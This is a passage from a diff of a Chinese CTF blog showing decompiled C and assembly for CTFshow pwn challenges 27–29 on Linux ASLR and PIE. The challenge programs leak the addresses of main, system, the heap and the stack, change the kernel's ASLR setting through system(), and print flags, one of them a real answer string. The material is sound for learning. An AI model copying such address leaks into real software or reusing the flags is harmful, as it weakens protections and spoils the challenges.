+; } // starts at 400687
+main endp  ; main函数结束
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="（二）main函数C源代码"><a href="#（二）main函数C源代码" class="headerlink" title="（二）main函数C源代码"></a>（二）main函数C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *ptr; // [rsp+0h] [rbp-10h]
+
+  ptr = malloc(4uLL);
+  dlopen("./libc-2.27.so", 258);
+  puts(s);
+  puts(asc_4008D0);
+  puts(asc_400950);
+  puts(asc_4009E0);
+  puts(asc_400A70);
+  puts(asc_400AF8);
+  puts(asc_400B90);
+  puts("    * *************************************                           ");
+  puts(aClassifyCtfsho);
+  puts("    * Type  : Linux_Security_Mechanisms                               ");
+  puts("    * Site  : https://ctf.show/                                       ");
+  puts("    * Hint  : Please confirm your ASLR level first !                  ");
+  puts("    * *************************************                           ");
+  puts("Here is your ASLR level:");
+  system("cat /proc/sys/kernel/randomize_va_space");
+  puts("If the result is 0 or 1, then you get the correct flag!");
+  puts("If not,you will get a fake flag!");
+  printf("flag is :ctfshow{%p", main);
+  printf("_%p", system);
+  printf("_%p", ptr);
+  puts("}");
+  free(ptr);
+  return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="十六、pwn28"><a href="#十六、pwn28" class="headerlink" title="十六、pwn28"></a>十六、pwn28</h2><h3 id="C源代码-2"><a href="#C源代码-2" class="headerlink" title="C源代码"></a>C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *ptr; // [rsp+0h] [rbp-10h]
+
+  ptr = malloc(4uLL);
+  dlopen("./libc-2.27.so", 258);
+  puts(s);
+  puts(asc_4008A0);
+  puts(asc_400920);
+  puts(asc_4009B0);
+  puts(asc_400A40);
+  puts(asc_400AC8);
+  puts(asc_400B60);
+  puts("    * *************************************                           ");
+  puts(aClassifyCtfsho);
+  puts("    * Type  : Linux_Security_Mechanisms                               ");
+  puts("    * Site  : https://ctf.show/                                       ");
+  puts("    * Hint  : Please confirm your ASLR level first !                  ");
+  puts("    * *************************************                           ");
+  puts("Here is your ASLR level:");
+  system("cat /proc/sys/kernel/randomize_va_space");
+  printf("flag is :ctfshow{%p", main);
+  printf("_%p", system);
+  puts("}");
+  free(ptr);
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="汇编源代码-1"><a href="#汇编源代码-1" class="headerlink" title="汇编源代码"></a>汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame
+
+; int __cdecl main(int argc, const char **argv, const char **envp)
+public main
+main proc near
+
+ptr= qword ptr -10h
+var_8= qword ptr -8
+
+; __unwind {
+push    rbp
+mov     rbp, rsp
+sub     rsp, 10h
+mov     edi, 4          ; size
+call    _malloc
+mov     [rbp+ptr], rax
+mov     esi, 102h       ; mode
+mov     edi, offset file ; "./libc-2.27.so"
+call    _dlopen
+mov     [rbp+var_8], rax
+mov     edi, offset s   ; "    "
+call    _puts
+mov     edi, offset asc_4008A0 ; "  "
+call    _puts
+mov     edi, offset asc_400920 ; " "
+call    _puts
+mov     edi, offset asc_4009B0 ; " "
+call    _puts
+mov     edi, offset asc_400A40 ; " "
+call    _puts
+mov     edi, offset asc_400AC8 ; "  "
+call    _puts
+mov     edi, offset asc_400B60 ; "    "
+call    _puts
+mov     edi, offset asc_400BE0 ; "    * *********************************"...
+call    _puts
+mov     edi, offset aClassifyCtfsho ; "    * Classify: CTFshow --- PWN --- "
+call    _puts
+mov     edi, offset aTypeLinuxSecur ; "    * Type  : Linux_Security_Mechanisms"...
+call    _puts
+mov     edi, offset aSiteHttpsCtfSh ; "    * Site  : https://ctf.show/        "...
+call    _puts
+mov     edi, offset aHintPleaseConf ; "    * Hint  : Please confirm your ASLR "...
+call    _puts
+mov     edi, offset asc_400BE0 ; "    * *********************************"...
+call    _puts
+mov     edi, offset aHereIsYourAslr ; "Here is your ASLR level:"
+call    _puts
+mov     edi, offset command ; "cat /proc/sys/kernel/randomize_va_space"
+call    _system
+mov     esi, offset main
+mov     edi, offset format ; "flag is :ctfshow{%p"
+mov     eax, 0
+call    _printf
+mov     esi, offset _system
+mov     edi, offset aP  ; "_%p"
+mov     eax, 0
+call    _printf
+mov     edi, offset asc_400DA8 ; "}"
+call    _puts
+mov     rax, [rbp+ptr]
+mov     rdi, rax        ; ptr
+call    _free
+mov     eax, 0
+leave
+retn
+; } // starts at 400687
+main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="十七、pwn29"><a href="#十七、pwn29" class="headerlink" title="十七、pwn29"></a>十七、pwn29</h2><h3 id="（一）C源代码"><a href="#（一）C源代码" class="headerlink" title="（一）C源代码"></a>（一）C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[4]; // [rsp+4h] [rbp-1Ch] BYREF
+  void *ptr; // [rsp+8h] [rbp-18h]
+  void *v6; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v7; // [rsp+18h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  ptr = malloc(4uLL);
+  v6 = dlopen("./libc-2.27.so", 258);
+  puts(s);
+  puts(asc_B10);
+  puts(asc_B90);
+  puts(asc_C20);
+  puts(asc_CB0);
+  puts(asc_D38);
+  puts(asc_DD0);
+  puts("    * *************************************                           ");
+  puts(aClassifyCtfsho);
+  puts("    * Type  : Linux_Security_Mechanisms                               ");
+  puts("    * Site  : https://ctf.show/                                       ");
+  puts("    * Hint  : Please confirm your ASLR level first !                  ");
+  puts("    * *************************************                           ");
+  system("echo 2 &gt; /proc/sys/kernel/randomize_va_space");
+  puts("Here is your ASLR level:");
+  system("cat /proc/sys/kernel/randomize_va_space");
+  puts("Let's take a look at protection:");
+  system("checksec pwn");
+  printf("executable: %p\n", main);
+  printf("system@plt: %p\n", &amp;system);
+  printf("heap: %p\n", ptr);
+  printf("stack: %p\n", v4);
+  puts("As you can see, the protection has been fully turned on and the address has been completely randomized!");
+  puts("Here is your flag:");
+  puts("ctfshow{Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!}");
+  free(ptr);
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="（二）汇编源代码"><a href="#（二）汇编源代码" class="headerlink" title="（二）汇编源代码"></a>（二）汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame
+
+; int __cdecl main(int argc, const char **argv, const char **envp)
+public main
+main proc near
+
+var_1C= byte ptr -1Ch
+ptr= qword ptr -18h
+var_10= qword ptr -10h
+var_8= qword ptr -8
+
+; __unwind {
+push    rbp
+mov     rbp, rsp
+sub     rsp, 20h
+mov     rax, fs:28h
+mov     [rbp+var_8], rax
+xor     eax, eax
+mov     edi, 4          ; size
+call    _malloc
+mov     [rbp+ptr], rax
+mov     esi, 102h       ; mode
+lea     rdi, file       ; "./libc-2.27.so"
+call    _dlopen
+mov     [rbp+var_10], rax
+lea     rdi, s          ; "    "
+call    _puts
+lea     rdi, asc_B10    ; "  "
+call    _puts
+lea     rdi, asc_B90    ; " "
+call    _puts
+lea     rdi, asc_C20    ; " "
+call    _puts
+lea     rdi, asc_CB0    ; " "
+call    _puts
+lea     rdi, asc_D38    ; "  "
+call    _puts
+lea     rdi, asc_DD0    ; "    "
+call    _puts
+lea     rdi, asc_E50    ; "    * *********************************"...
+call    _puts
+lea     rdi, aClassifyCtfsho ; "    * Classify: CTFshow --- PWN --- "
+call    _puts
+lea     rdi, aTypeLinuxSecur ; "    * Type  : Linux_Security_Mechanisms"...
+call    _puts
+lea     rdi, aSiteHttpsCtfSh ; "    * Site  : https://ctf.show/        "...
+call    _puts
+lea     rdi, aHintPleaseConf ; "    * Hint  : Please confirm your ASLR "...
+call    _puts
+lea     rdi, asc_E50    ; "    * *********************************"...
+call    _puts
+lea     rdi, command    ; "echo 2 &gt; /proc/sys/kernel/randomize_va_"...
+call    system
+lea     rdi, aHereIsYourAslr ; "Here is your ASLR level:"
+call    _puts
+lea     rdi, aCatProcSysKern ; "cat /proc/sys/kernel/randomize_va_space"
+call    system
+lea     rdi, aLetSTakeALookA ; "Let's take a look at protection:"
+call    _puts
+lea     rdi, aChecksecPwn ; "checksec pwn"
+call    system
+lea     rsi, main
+lea     rdi, format     ; "executable: %p\n"
+mov     eax, 0
+call    _printf
+mov     rax, cs:system_ptr
+mov     rsi, rax
+lea     rdi, aSystemPltP ; "system@plt: %p\n"
+mov     eax, 0
+call    _printf
+mov     rax, [rbp+ptr]
+mov     rsi, rax
+lea     rdi, aHeapP     ; "heap: %p\n"
+mov     eax, 0
+call    _printf
+lea     rax, [rbp+var_1C]
+mov     rsi, rax
+lea     rdi, aStackP    ; "stack: %p\n"
+mov     eax, 0
+call    _printf
+lea     rdi, aAsYouCanSeeThe ; "As you can see, the protection has been"...
+call    _puts
+lea     rdi, aHereIsYourFlag ; "Here is your flag:"
+call    _puts
+lea     rdi, aCtfshowAddress ; "ctfshow{Address_Space_Layout_Randomizat"...
+call    _puts
+mov     rax, [rbp+ptr]
+mov     rdi, rax        ; ptr
+call    _free
+mov     eax, 0
+mov     rdx, [rbp+var_8]
+xor     rdx, fs:28h
+jz      short locret_9F8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725162402607.png" alt="image-20230725162402607"></p>
 
                 
             </div>
@@ -2654,7 +3191,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.8k</span>&nbsp;字
+                class="white-color">43.7k</span>&nbsp;字
             
             
             
